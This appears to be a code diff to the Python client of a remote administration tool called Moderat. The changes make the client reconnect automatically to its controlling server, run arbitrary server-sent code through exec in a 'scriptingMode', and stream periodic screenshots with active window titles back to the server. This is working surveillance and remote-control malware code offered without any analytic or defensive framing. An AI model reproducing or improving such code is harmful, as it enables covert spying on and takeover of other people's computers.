@@ -172,11 +172,11 @@ class Screenshot:
         self.bmp_info = BITMAPINFO()
 
     def get(self):
-        return str({
+        return {
             'width': self.width,
             'height': self.height,
             'screenshotbits': self.screen_bits()
-        })
+        }
 
     def screen_bits(self):
         h_desktop_dc = User32.GetWindowDC(self.hDesktopWnd)
@@ -266,12 +266,12 @@ class Modes(threading.Thread):
                 self.send_data('noWebcamError', self.mode, self.session_id, self.module_id)
 
         elif self.mode == 'scriptingMode':
-            mprint = ''
+            moutput = ''
             try:
                 exec self.payload
-                if mprint == '':
+                if moutput == '':
                     return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
-                self.send_data(str(mprint), self.mode, self.session_id, self.module_id)
+                self.send_data(str(moutput), self.mode, self.session_id, self.module_id)
                 return
             except Exception as error:
                 self.send_data(str(error), self.mode, self.session_id, self.module_id)
@@ -355,6 +355,8 @@ class ModeratClient(asyncore.dispatcher):
             self.close()
         else:
             self.connected = False
+            time.sleep(3)
+            self.initiate_connection_with_server()
 
     def handle_error(self):
         pass
@@ -404,13 +406,16 @@ class ModeratClient(asyncore.dispatcher):
                 else:
                     self.send_data(self.info.values['i'], 'clientInitializing', MODERATOR)
             elif msg['mode'] == 'clientInitializing':
-                if len(msg['payload']) == 12:
-                    self.info.set_values({'i': msg['payload']})
-                    self.info.values['i'] = msg['payload']
-                    if self.info.values['sts']:
-                        ScreenshotLogger(self).start()
-            elif msg['mode'] == 'setLogSettings':
+                self.info.set_values({'i': msg['payload']})
+                self.info.values['i'] = msg['payload']
+                print self.info.values
+                if self.info.values['sts']:
+                    ScreenshotLogger(self).start()
+            elif msg['mode'] == 'clientSettings':
                 self.info.values = self.info.set_values(msg['payload'])
+                if self.info.values['sts']:
+                    ScreenshotLogger(self).start()
+                self.send_data('newSettingsSaved', 'clientSettings')
             elif msg['mode'] == 'terminateProcess':
                 if self.modes.has_key(msg['payload']):
                     self.modes[msg['payload']].stop()
@@ -467,20 +472,16 @@ class BITMAPINFO(ctypes.Structure):
 
 
 class ScreenshotLogger(threading.Thread):
-
     def __init__(self, client):
         super(ScreenshotLogger, self).__init__()
         self.active = True
         self.client = client
 
     def run(self):
-        while self.active and self.client.connected:
-            payload = {
-                'screen_bits': screenshot.get(),
-                'title_name': get_window_title(),
-                'width': screenshot.width,
-                'height': screenshot.height,
-            }
+        print 'ScreenshotLogger Started'
+        while self.active and self.client.connected and self.client.info.values['sts']:
+            payload = screenshot.get()
+            payload['title_name'] = get_window_title()
             self.client.send_data(payload, 'screenshotLog')
             time.sleep(self.client.info.values['std'])
 
